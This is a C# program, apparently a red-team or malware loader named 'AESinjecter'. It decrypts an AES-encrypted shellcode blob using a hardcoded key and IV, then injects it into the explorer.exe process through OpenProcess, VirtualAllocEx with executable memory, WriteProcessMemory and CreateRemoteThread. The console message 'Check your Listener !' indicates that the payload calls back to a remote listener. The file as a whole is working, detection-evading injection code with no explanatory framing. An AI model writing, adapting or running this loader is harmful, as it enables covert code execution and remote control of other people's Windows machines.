using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AESinjecter
{
    internal static class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
        processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            byte[] Key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };
            byte[] IV = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");


            byte[] duffer = new byte[] { 0x2b, 0xc3, 0xb0, 0x19, 0xe4, 0x28, 0x82, 0xa8, 0x44, 0xbd, 0xa9, 0x27, 0x03, 0xd2, 0x35, 0x50, 0x89, 0xa7, 0x9b, 0x72, 0x26, 0x0f, 0x0e, 0x22, 0x59, 0x22, 0x65, 0xf0, 0x9d, 0xcf, 0x1c, 0xb9, 0x7b, 0xaf, 0x8a, 0x1c, 0x85, 0x13, 0xfd, 0x41, 0x9f, 0xbd, 0x76, 0xdb, 0xff, 0x4e, 0x3c, 0xbb, 0x65, 0x73, 0xc4, 0x31, 0xfb, 0x03, 0x00, 0xd1, 0xb6, 0x8c, 0xd3, 0xa8, 0xd1, 0x60, 0x83, 0x48, 0xab, 0xa3, 0x5e, 0x2f, 0x3c, 0xbc, 0xcd, 0x87, 0x27, 0x20, 0x87, 0x8f, 0x58, 0x02, 0x5a, 0xec, 0x59, 0xcb, 0xb2, 0xe0, 0x94, 0x9d, 0x4b, 0x60, 0xa5, 0x62, 0xec, 0xfc, 0xe3, 0xe0, 0x0f, 0x15, 0x27, 0x63, 0x6d, 0xdc, 0x60, 0xc3, 0x5d, 0xba, 0x7b, 0x97, 0xe9, 0x35, 0x44, 0x08, 0xf5, 0xbc, 0xcf, 0x0e, 0x3e, 0x42, 0xce, 0x76, 0x72, 0x13, 0xfb, 0xd5, 0x2b, 0x33, 0xa7, 0xbf, 0x79, 0xdc, 0x64, 0x39, 0x35, 0x74, 0x7a, 0x06, 0xf0, 0x90, 0xf6, 0x79, 0x08, 0xb7, 0x17, 0x50, 0xf9, 0x14, 0xcc, 0xae, 0xee, 0xa5, 0xdd, 0xe3, 0x48, 0xe0, 0x45, 0x78, 0x33, 0x31, 0x98, 0xbb, 0xa9, 0x22, 0x9e, 0x8e, 0x87, 0x52, 0xa5, 0xd2, 0x86, 0x0d, 0xd3, 0x0a, 0x66, 0xdb, 0x96, 0xd0, 0x61, 0xeb, 0x22, 0xec, 0xb3, 0x59, 0xa6, 0xe0, 0x73, 0x45, 0xbb, 0x31, 0xdf, 0x32, 0x5d, 0x48, 0xc8, 0x2e, 0xab, 0xcc, 0xc8, 0xcf, 0x97, 0xd8, 0xc0, 0x22, 0x52, 0xa6, 0xba, 0xa4, 0x41, 0x4c, 0x88, 0x78, 0x09, 0xcc, 0xec, 0xa3, 0x26, 0x45, 0x67, 0x8a, 0x27, 0xbf, 0x92, 0xd4, 0x51, 0xc2, 0xaf, 0x4d, 0xb4, 0xbc, 0x7b, 0x46, 0xda, 0x1b, 0xd5, 0x44, 0x1a, 0x5f, 0x9d, 0x2b, 0x11, 0x2d, 0xb8, 0x7b, 0xae, 0x06, 0xfe, 0x12, 0x8e, 0xa2, 0xa9, 0x06, 0xcd, 0xe4, 0x3f, 0x2f, 0xb9, 0xd0, 0x66, 0x11, 0xec, 0xaa, 0xfa, 0x27, 0x86, 0x09, 0xef, 0x05, 0xe9, 0x1b, 0xb4, 0xa6, 0xc1, 0x14, 0x51, 0x72, 0x90, 0x7e, 0xf2, 0xa4, 0xa0, 0x31, 0x4e, 0xd5, 0x00, 0x7d, 0xac, 0x59, 0x61, 0xa0, 0x5e, 0x12, 0xf2, 0x28, 0x00, 0x13, 0x74, 0xfb, 0xca, 0x6c, 0x44, 0x76, 0xd4, 0xc8, 0xcd, 0xc6, 0x36, 0x43, 0xda, 0xe9, 0x39, 0x29, 0x3d, 0xe7, 0x36, 0xa6, 0x84, 0xac, 0x61, 0x1f, 0x41, 0xb0, 0xa7, 0x81, 0x00, 0x3f, 0x73, 0x5d, 0x5f, 0x96, 0x56, 0x27, 0xf0, 0x61, 0x60, 0xee, 0x90, 0x15, 0x86, 0xac, 0x38, 0x23, 0x7c, 0x32, 0x0c, 0x48, 0xca, 0xba, 0x89, 0x29, 0x33, 0x56, 0x48, 0x46, 0x96, 0x9a, 0xd6, 0xc3, 0x2d, 0x39, 0xae, 0xd0, 0x50, 0xb0, 0x17, 0xa6, 0x36, 0xc9, 0xf4, 0x0e, 0xe9, 0x2f, 0xdb, 0x3f, 0x21, 0x10, 0x0e, 0xc3, 0x4a, 0xd6, 0x98, 0xb2, 0xf2, 0xf7, 0x10, 0x1f, 0x85, 0x74, 0xbd, 0x94, 0x5c, 0x46, 0x29, 0x26, 0x01, 0x88, 0xdf, 0x97, 0x52, 0x06, 0x0a, 0x59, 0xd1, 0xfc, 0x10, 0xfb, 0x35, 0x4b, 0xb0, 0x25, 0x4d, 0x82, 0x39, 0xb8, 0xb2, 0x2f, 0x9c, 0xed, 0x8c, 0xb3, 0xe9, 0xc7, 0x49, 0xb6, 0xc3, 0xa4, 0x2a, 0x90, 0x70, 0x01, 0xb6, 0x92, 0xe9, 0x77, 0x82, 0xb6, 0xe5, 0xe0, 0x9a, 0x1f, 0x21, 0xc7, 0x93, 0x60, 0x08, 0xbf, 0x38, 0x2a, 0xea, 0xf7, 0x5d, 0xde, 0xa4, 0x22, 0x81, 0x38, 0x48, 0x93, 0xdb, 0x52, 0xb6, 0x1e, 0x25, 0xd0, 0x08, 0x72, 0xb8, 0x7b, 0xd9, 0xb8, 0x4c, 0x63, 0xce, 0x5c, 0xb2, 0xb6, 0x5d, 0x4f, 0xe4, 0xea, 0x8f, 0xec, 0xdc, 0x2d, 0x30, 0x0d, 0x76, 0x1a, 0x68, 0x7f, 0xde, 0xc5, 0xb6, 0x2d, 0xfa, 0xcc, 0xfb, 0xa7, 0xa9, 0x70, 0xa6, 0x32, 0x9d, 0xf4, 0x0a, 0xdb, 0x6e, 0xdc, 0x03, 0xf5, 0x91, 0x93, 0xac, 0x3b, 0xfe, 0xcb };
            byte[] Downward = Decrypt(duffer, Key, IV);
            StringBuilder hexCodes = new StringBuilder(Downward.Length * 2);
            foreach (byte bite in Downward)
            {
                hexCodes.AppendFormat("0x{0:x2},", bite);
            }
            Thread.Sleep(5000);
            if (Run(Downward))
            {
                Console.WriteLine("Check your Listener !");
            }

        }
        private static bool Run(byte[] Cover)
        {
            Process[] Procode = Process.GetProcessesByName("explorer");
            int pid = Procode[0].Id;
            IntPtr ProcessHard = OpenProcess(0x001F0FFF, false, pid);
            IntPtr acute = VirtualAllocEx(ProcessHard, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr SizeOurt;
            WriteProcessMemory(ProcessHard, acute, Cover, Cover.Length, out SizeOurt);
            CreateRemoteThread(ProcessHard, IntPtr.Zero, 0, acute, IntPtr.Zero, 0, IntPtr.Zero);
            return true;
        }
        private static byte[] Decrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;
                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    using (var ms = new MemoryStream())
                    using (var cryptoStream = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(CEncryptedShell, 0, CEncryptedShell.Length);
                        cryptoStream.FlushFinalBlock();

                        return ms.ToArray();
                    }
                }
            }
        }
    }
}


